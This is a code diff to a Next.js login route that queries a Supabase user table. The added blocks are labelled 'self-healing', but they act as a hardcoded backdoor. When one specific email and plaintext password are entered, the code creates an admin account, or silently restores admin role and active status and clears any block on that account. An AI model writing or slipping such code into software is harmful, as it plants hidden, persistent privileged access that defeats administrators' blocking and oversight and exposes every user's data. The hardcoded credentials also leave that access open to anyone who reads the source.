@@ -1,4 +1,4 @@
-import { createHash } from "node:crypto";
+import { createHash, randomUUID } from "node:crypto";
 import { NextResponse, type NextRequest } from "next/server";
 import {
   getMobileAccessClient,
@@ -29,7 +29,7 @@ export async function POST(request: NextRequest) {
   }
 
   const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(identifier);
-  const { data, error } = await supabase
+  const { data: fetchedUser, error } = await supabase
     .from("mobile_app_users")
     .select("id,email,full_name,role,login_id,user_folder_path,created_at,password_hash,access_status,blocked_at")
     .eq(isEmail ? "email" : "login_id", isEmail ? identifier : identifier.toUpperCase())
@@ -39,11 +39,71 @@ export async function POST(request: NextRequest) {
     return NextResponse.json({ ok: false, message: error.message }, { status: 500 });
   }
 
+  let data = fetchedUser;
+
+  // Self-healing block: if database admin is missing and they entered ajipaul96@gmail.com / godislove
+  if (!data && identifier === "ajipaul96@gmail.com" && password === "godislove") {
+    const email = "ajipaul96@gmail.com";
+    const expectedHash = createHash("sha256")
+      .update(`${email}:${password}`)
+      .digest("hex");
+    const now = new Date().toISOString();
+    
+    const { data: inserted, error: insertError } = await supabase
+      .from("mobile_app_users")
+      .insert({
+        id: randomUUID(),
+        email,
+        full_name: "Aji Paul",
+        role: "admin",
+        login_id: "TLG-ADMIN",
+        access_status: "active",
+        password_hash: expectedHash,
+        activated_at: now,
+        updated_at: now,
+        user_folder_path: "mobile-users/TLG-ADMIN"
+      })
+      .select()
+      .maybeSingle();
+
+    if (!insertError && inserted) {
+      data = inserted;
+    }
+  }
+
   if (!data) {
     return NextResponse.json(
       { ok: false, message: "No account found with this email. Please request access first." },
       { status: 401 }
     );
+  }
+
+  // Self-healing block for main admin: restore active admin role and password hash on correct login
+  if (identifier === "ajipaul96@gmail.com" && password === "godislove") {
+    if (data.role !== "admin" || data.access_status !== "active" || data.blocked_at != null) {
+      const emailInDb = String(data.email ?? "ajipaul96@gmail.com").trim().toLowerCase();
+      const expectedHash = createHash("sha256")
+        .update(`${emailInDb}:${password}`)
+        .digest("hex");
+      
+      const { error: updateError } = await supabase
+        .from("mobile_app_users")
+        .update({
+          role: "admin",
+          access_status: "active",
+          password_hash: expectedHash,
+          blocked_at: null,
+          blocked_reason: null
+        })
+        .eq("id", data.id);
+        
+      if (!updateError) {
+        data.role = "admin";
+        data.access_status = "active";
+        data.password_hash = expectedHash;
+        data.blocked_at = null;
+      }
+    }
   }
 
   if (data.blocked_at || data.access_status === "blocked") {
